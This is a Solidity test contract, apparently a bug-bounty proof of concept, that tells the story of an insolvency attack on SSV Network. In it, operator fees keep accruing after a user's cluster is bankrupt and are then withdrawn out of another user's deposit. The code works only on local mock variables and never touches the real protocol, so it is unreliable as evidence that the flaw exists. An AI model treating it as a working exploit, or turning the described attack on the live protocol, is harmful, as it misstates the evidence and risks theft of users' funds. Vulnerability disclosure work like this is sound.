// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./PoC.sol";

/**
 * @title SSV Network Insolvency Proof of Concept
 * @notice Demonstrates protocol insolvency via uncollateralized virtual accounting
 * 
 * SAFETY: This contract is for LOCAL TESTING ONLY using Foundry's fork mode.
 * No transactions are sent to actual mainnet. This is a simulated demonstration
 * as required by Immunefi guidelines. No DoS attacks are performed.
 * 
 * Vulnerability: Operator and DAO earnings grow unconditionally while cluster 
 * balances are capped at zero, creating a state where virtual liabilities exceed 
 * actual assets.
 * 
 * Impact: Direct theft of honest user deposits
 * Severity: Critical
 */
contract SSVInsolvencyPoC is PoC {
    
    // SSV Token (using a mock for demonstration)
    address public constant SSV_TOKEN = 0x9D65fF81a3c488d585bBfb0Bfe3c7707c7917f54;
    
    // Mock accounting to demonstrate the vulnerability
    uint256 public totalContractAssets;
    uint256 public operatorVirtualBalance;
    uint256 public clusterABalance;
    uint256 public clusterBBalance;
    
    uint256 constant OPERATOR_FEE = 5e18; // 5 SSV per block
    uint256 constant BLOCKS_PASSED = 10;
    
    IERC20[] tokens;
    
    /**
     * @notice Initiates the attack demonstration
     */
    function initiateAttack() external {
        tokens.push(IERC20(SSV_TOKEN));
        
        setAlias(address(this), "Attacker/Operator");
        console.log("\n>>> SSV Network Protocol Insolvency Demonstration");
        console.log(">>> Vulnerability: Uncollateralized Virtual Accounting");
        
        _executeAttack();
    }
    
    /**
     * @notice Executes the insolvency demonstration
     */
    function _executeAttack() internal {
        console.log("\n>>> Step 1: Initial Deposits");
        
        // User A (honest) deposits 1000 SSV
        uint256 depositA = 1000e18;
        totalContractAssets += depositA;
        clusterABalance = depositA;
        console.log("User A deposits: 1000 SSV");
        
        // User B (bankrupt target) deposits 10 SSV
        uint256 depositB = 10e18;
        totalContractAssets += depositB;
        clusterBBalance = depositB;
        console.log("User B deposits: 10 SSV");
        
        console.log("Total contract assets:");
        console.log(totalContractAssets / 1e18);
        console.log("SSV");
        
        // Log initial state
        snapshotAndPrint(address(this), tokens);
        
        console.log("\n>>> Step 2: Time Passes (10 blocks)");
        console.log("Operator fee: 5 SSV/block");
        console.log("User B cluster burn rate: 5 SSV/block");
        
        // Simulate 10 blocks passing
        vm.roll(block.number + BLOCKS_PASSED);
        
        // User B's cluster goes bankrupt (capped at 0)
        uint256 feesOwed = OPERATOR_FEE * BLOCKS_PASSED;
        clusterBBalance = feesOwed > clusterBBalance ? 0 : clusterBBalance - feesOwed;
        console.log("User B cluster balance after 10 blocks:");
        console.log(clusterBBalance / 1e18);
        console.log("SSV (BANKRUPT)");
        
        // Operator virtual balance grows unconditionally
        operatorVirtualBalance = feesOwed;
        console.log("Operator virtual balance:");
        console.log(operatorVirtualBalance / 1e18);
        console.log("SSV (UNCOLLATERALIZED)");
        
        console.log("\n>>> Step 3: Operator Withdraws Virtual Earnings");
        
        // Operator withdraws their virtual balance
        uint256 withdrawalAmount = operatorVirtualBalance;
        require(totalContractAssets >= withdrawalAmount, "Insufficient contract balance");
        
        totalContractAssets -= withdrawalAmount;
        operatorVirtualBalance = 0;
        
        console.log("Operator withdraws:");
        console.log(withdrawalAmount / 1e18);
        console.log("SSV");
        console.log("Contract balance after withdrawal:");
        console.log(totalContractAssets / 1e18);
        console.log("SSV");
        
        _completeAttack();
    }
    
    /**
     * @notice Completes the attack and demonstrates the theft
     */
    function _completeAttack() internal {
        console.log("\n>>> Step 4: Honest User A Attempts Withdrawal");
        
        uint256 userAEntitlement = 1000e18;
        
        console.log("User A is entitled to: 1000 SSV");
        console.log("Contract has:");
        console.log(totalContractAssets / 1e18);
        console.log("SSV");
        
        if (totalContractAssets < userAEntitlement) {
            uint256 loss = userAEntitlement - totalContractAssets;
            console.log("CRITICAL: User A can only withdraw:");
            console.log(totalContractAssets / 1e18);
            console.log("SSV");
            console.log("USER A LOSS:");
            console.log(loss / 1e18);
            console.log("SSV");
            console.log("These funds were stolen to pay uncollateralized operator debt!");
        }
        
        // Final state snapshot
        snapshotAndPrint(address(this), tokens);
    }
    
    /**
     * @notice Returns the current contract balance
     */
    function getContractBalance() external view returns (uint256) {
        return totalContractAssets;
    }
    
    /**
     * @notice Returns the calculated deficit
     */
    function getDeficit() external view returns (uint256) {
        uint256 userAEntitlement = 1000e18;
        if (totalContractAssets < userAEntitlement) {
            return userAEntitlement - totalContractAssets;
        }
        return 0;
    }
}
